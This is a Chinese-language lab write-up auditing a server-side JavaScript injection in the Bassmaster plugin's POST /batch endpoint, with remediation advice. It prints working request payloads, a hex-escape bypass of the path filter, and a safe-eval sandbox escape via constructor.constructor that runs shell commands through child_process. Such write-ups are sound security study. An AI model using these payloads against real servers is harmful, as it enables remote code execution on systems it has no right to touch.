这篇文章记录 Bassmaster <= 1.5.1 的白盒审计过程。Bassmaster 是 Hapi 框架中的批量请求插件，问题出现在 `POST /batch` 的 request chaining 逻辑中：用户可控的 `requests[].path` 会被解析为引用字段，并最终拼接进 `eval()`。攻击者可以借此实现 Server-Side JavaScript Injection，并在 Node.js 运行时中升级为 RCE。文章最后也会分析 Extra Mile 版本中使用 `safe-eval` 后仍然可以被 sandbox escape 的原因。


# 漏洞概述

- 产品：Bassmaster
- 版本：Bassmaster <= 1.5.1
- 漏洞类型：Server-Side JavaScript Injection
- 入口 URL：`POST /batch`
- 可控参数：`requests[].path`
- 认证要求：无需认证
- 触发位置：`lib/batch.js -> internals.batch()`
- 危险函数：`eval()`
- 最终影响：任意 JavaScript 执行 -> Node.js RCE -> Reverse Shell


# 审计入口

Bassmaster 是 Hapi 框架的批量请求插件。审计时可以先从插件注册入口开始：

```js
exports.register = function (pack, options, next) {

    pack.route({
        method: 'POST',
        path: settings.batchEndpoint,
        config: Batch.config(settings)
    });

    next();
};
```

默认注册的接口为：

```http
POST /batch
```

所有请求最终进入：

```js
Batch.config()
```

对应文件为：

```text
lib/batch.js
```

## 定位危险函数

优先搜索常见的动态执行入口：

```text
eval(
Function(
vm.runInContext(
```

![[Pasted image 20260608202405.png]]

可以发现如下代码：

```js
eval('value = ref.' + parts[i].value + ';');
```

完整上下文如下：

```js
if (ref) {
    var value = null;

    try {
        eval('value = ref.' + parts[i].value + ';');
    }
    catch (e) {
        error = new Error(e.message);
    }
}
```

这里的 `parts[i].value` 会直接进入 `eval()`，属于典型的代码执行危险点。

## 追踪 parts 来源

继续向上追踪调用关系：

```js
internals.batch(
    request,
    resultsData,
    pos,
    parts,
    callback
)
```

调用位置：

```js
callBatch(i, parts)
```

继续追踪：

```js
var parts = requests[i];
```

最终发现：

```js
var result =
request.payload.requests[i].path.replace(
    requestRegex,
    parseRequest
);
```

因此可以确认：

```js
request.payload.requests[i].path
```

来自用户输入。


# 漏洞成因

## 用户输入进入 eval

攻击者可控的请求结构如下：

```json
{
    "requests":[
        {
            "path":"/item/$1.id"
        }
    ]
}
```

经过 `parseRequest()` 后会被解析为：

```js
parts.push({
    type: 'ref',
    index: $1,
    value: $2
});
```

最终：

```js
parts[i].value
```

进入：

```js
eval()
```

形成：

```js
eval(
    'value = ref.' + user_input
);
```

## 为什么能执行代码

Bassmaster 原本希望实现如下引用功能：

```text
/item/$1.id
```

例如前一个请求返回：

```json
{
    "id": "123"
}
```

插件会将 `$1.id` 转换为：

```js
ref.id
```

开发者使用 `eval()` 动态读取属性：

```js
eval(
    'value = ref.id'
);
```

问题在于 `eval()` 不只会读取属性，它也能执行任意 JavaScript。因此只要构造：

```js
ref.id;PAYLOAD
```

就可以让 payload 被执行。


# 利用条件

完整利用需要满足：

1. 目标存在 `POST /batch` 接口。
2. 目标允许 request chaining。
3. 支持 `$1.xxx` 引用语法。
4. 危险的 `eval()` 调用仍然存在。
5. 用户输入没有被正确过滤或安全解析。


# 利用路线

## 第一阶段：验证批处理功能

官方示例请求如下：

```json
{
  "requests":[
    {
      "method":"get",
      "path":"/profile"
    },
    {
      "method":"get",
      "path":"/item"
    },
    {
      "method":"get",
      "path":"/item/$1.id"
    }
  ]
}
```

返回示例：

```json
[
  {
    "id":"fa0dbda9b1b"
  },
  {
    "id":"55cf687663"
  },
  {
    "id":"55cf687663"
  }
]
```

这说明：

```text
$1.id
```

能够成功引用第二个请求的结果。

## 第二阶段：分析过滤规则

路径解析使用的正则如下：

```js
/(?:\/)(?:\$(\d)+\.)?([^\/\$]*)/g
```

它限制了：

```text
/
$
```

但仍允许：

```text
;
(
)
'
"
.
,
```

因此：

```text
;PAYLOAD
```

可以通过校验并进入后续执行流程。

## 第三阶段：验证 JavaScript 执行

构造如下路径：

```json
{
  "method":"get",
  "path":"/item/$1.id;require('util').log('CODE_EXECUTION');"
}
```

进入 `eval()` 后会形成：

```js
eval(
    'value = ref.id;require("util").log("CODE_EXECUTION");'
);
```

成功执行后，服务器控制台会打印日志：

```bash
student@bassmaster:~$ ls
bassmaster            Desktop    Downloads  Pictures  Templates
bassmaster_extramile  Documents  Music      Public    Videos
student@bassmaster:~$ cd bassmaster
student@bassmaster:~/bassmaster$ ls
CONTRIBUTING.md  images    lib      Makefile      package.json  test
examples         index.js  LICENSE  node_modules  README.md
student@bassmaster:~/bassmaster$ nodejs examples/batch.js
Server started.
8 Jun 02:31:46 - CODE_EXECUTION
```


# Payload 构造

## 验证代码执行

Payload：

```js
require('util').log('CODE_EXECUTION');
```

最终请求：

```http
POST /batch
```

```json
{
    "requests":[
        {
            "method":"get",
            "path":"/profile"
        },
        {
            "method":"get",
            "path":"/item"
        },
        {
            "method":"get",
            "path":"/item/$1.id;require('util').log('CODE_EXECUTION');"
        }
    ]
}
```

服务器控制台：

```text
CODE_EXECUTION
```

## 字符限制绕过

直接使用：

```js
/bin/bash
```

会失败。原因是 `/` 会被正则作为路径分隔符处理。例如：

```js
/bin/bash
```

会被拆成：

```text
bin
bash
```

因此无法完整进入 `eval()`。

## 十六进制编码绕过

可以使用 JavaScript hex escape：

```js
\x2fbin\x2fbash
```

代替：

```js
/bin/bash
```

这样即可通过路径解析限制。


# 最终利用链

```text
HTTP POST
    ↓
/batch
    ↓
request.payload.requests
    ↓
parseRequest()
    ↓
parts[]
    ↓
internals.process()
    ↓
internals.batch()
    ↓
eval()
    ↓
Arbitrary JavaScript Execution
    ↓
Node.js Runtime
    ↓
child_process
    ↓
RCE
```


# 修复建议

## 禁止使用 eval

不要使用：

```js
eval(
    'value = ref.' + userInput
);
```

可以改为：

```js
value = ref[userInput];
```

或者使用安全的路径读取方式：

```js
lodash.get(ref, path);
```

## 属性白名单

仅允许合法字段，例如：

```js
id
name
project
```

禁止任意属性访问。

## 避免伪安全沙箱

不要盲目信任：

```js
safe-eval
vm.runInContext
vm.runInNewContext
```

所有用户输入都应视为不可信，沙箱只能作为额外隔离层，不能替代输入校验和安全设计。

## 升级版本

升级到官方修复版本，并彻底移除：

```js
eval()
```

相关逻辑。


# Extra Mile：safe-eval 仍然可被逃逸

## 漏洞背景

原始 Bassmaster 版本使用：

```js
eval(
    'value = ref.' + parts[i].value + ';'
);
```

这会导致直接的 JavaScript Injection。

在 Extra Mile 版本中，开发者尝试使用 `safe-eval` 修复该问题：

```js
var eval = require('safe-eval');

var context = {
    ref: ref,
    value: value,
    parts: parts,
    i: i
};

value = eval(
    'ref.' + parts[i].value + ';',
    context
);
```

开发者认为：

```text
eval()
    ↓
safe-eval()
    ↓
安全
```

但这个判断并不成立。

## safe-eval 工作机制

`safe-eval` 本质上不是重新实现 JavaScript 解释器，它的核心实现依赖：

```js
vm.runInNewContext()
```

在 `bassmaster_extramile/node_modules/safe-eval/index.js` 中，核心代码如下：

```js
var vm = require('vm')

module.exports = function safeEval (code, context, opts) {
  var sandbox = {}
  ...
  if (context) {
    Object.keys(context).forEach(function (key) {
      sandbox[key] = context[key]
    })
  }

  vm.runInNewContext(code, sandbox, opts)
  return sandbox[resultKey]
}
```

这里的 `sandbox` 是 `safe-eval` 自己创建的对象。`vm.runInNewContext(code, sandbox)` 的意思是：把这段 JavaScript 放到新的执行上下文中运行，并把 `sandbox` 当作它的全局对象。

```text
用户代码
    ↓
vm.runInNewContext()
    ↓
sandbox
```

## 问题所在

开发者将 `ref` 直接放入 sandbox：

```js
var context = {
    ref: ref
};
```

但 `ref` 实际上是来自宿主 Node.js 环境中的普通对象。因此攻击者仍然可以访问：

```js
ref.constructor
```

进一步访问：

```js
ref.constructor.constructor
```

最终获得：

```js
Function
```

通过两个 `constructor`，攻击者可以从普通对象拿到宿主环境的 `Function` 构造器。这个 `Function` 构造器会在宿主上下文中编译执行代码，因此可以重新访问 Node.js 的 `process`。

## Sandbox Escape

获得 `Function` 后即可回到宿主环境：

```text
ref
    ↓
constructor
    ↓
constructor
    ↓
Function
    ↓
process
    ↓
mainModule
    ↓
require()
    ↓
child_process
    ↓
exec()
```

最终形成：

```text
safe-eval Sandbox Escape
```

## 过滤限制分析

Bassmaster 仍然使用：

```js
/(?:\/)(?:\$(\d)+\.)?([^\/\$]*)/g
```

进行路径解析。因此下面两个字符无法直接出现在 payload 中：

```text
/
$
```

例如：

```js
/var/www
/bin/bash
```

都会被正则拆分。

### 绕过方式

继续使用 JavaScript hex escape：

```js
\x2f
```

表示：

```text
/
```

例如：

```js
\x2fbin\x2fbash
```

实际执行时等价于：

```text
/bin/bash
```

同理：

```js
\x2ftmp
\x2fetc
\x2fdev
```

也可以正常使用。

## 返回值限制

在 `batch.js` 中还存在额外检查：

```js
if (
    value.match &&
    value.match(/^[\w:]+$/)
)
{
    path += value;
}
```

因此 `eval()` 执行后的返回值必须满足：

```text
^[\w:]+$
```

### 错误返回值

例如：

```js
Buffer
Object
Error
hello world
/tmp/test
```

都可能导致：

```text
500 Internal Server Error
```

### 正确返回值

通常返回：

```js
OK
```

即可满足检查。例如：

```js
return 'OK';
```

## RCE 验证

构造：

```js
constructor.constructor(
"process.mainModule.require('child_process').exec('id > \\x2ftmp\\x2frce'); return \"OK\"'"
)()
```

执行后会生成：

```text
/tmp/rce
```

验证内容：

```text
uid=1000(student)
gid=1000(student)
```

证明命令已经在目标系统执行。

## Extra Mile 最终利用链

```text
HTTP POST
    ↓
/batch
    ↓
request.payload.requests
    ↓
parseRequest()
    ↓
parts[]
    ↓
safe-eval()
    ↓
ref
    ↓
constructor
    ↓
constructor
    ↓
Function
    ↓
process.mainModule
    ↓
require()
    ↓
child_process
    ↓
exec()
    ↓
RCE
```

## Extra Mile 总结

开发者尝试通过：

```text
eval()
    ↓
safe-eval()
```

修复漏洞。但：

```text
safe-eval != 安全沙箱
```

因为 `ref` 仍然来自宿主环境。攻击者可以利用：

```js
ref.constructor.constructor
```

获取：

```js
Function
```

最终逃逸：

```text
vm sandbox
```

并重新获得：

```text
Node.js Runtime
```

权限。因此 Bassmaster Extra Mile 本质上仍属于：

```text
Server-Side JavaScript Injection
    ↓
Sandbox Escape
    ↓
Node.js RCE
```

只是利用链从：

```text
eval()
```

变成了：

```text
safe-eval()
    ↓
constructor.constructor
    ↓
Function
    ↓
child_process
```
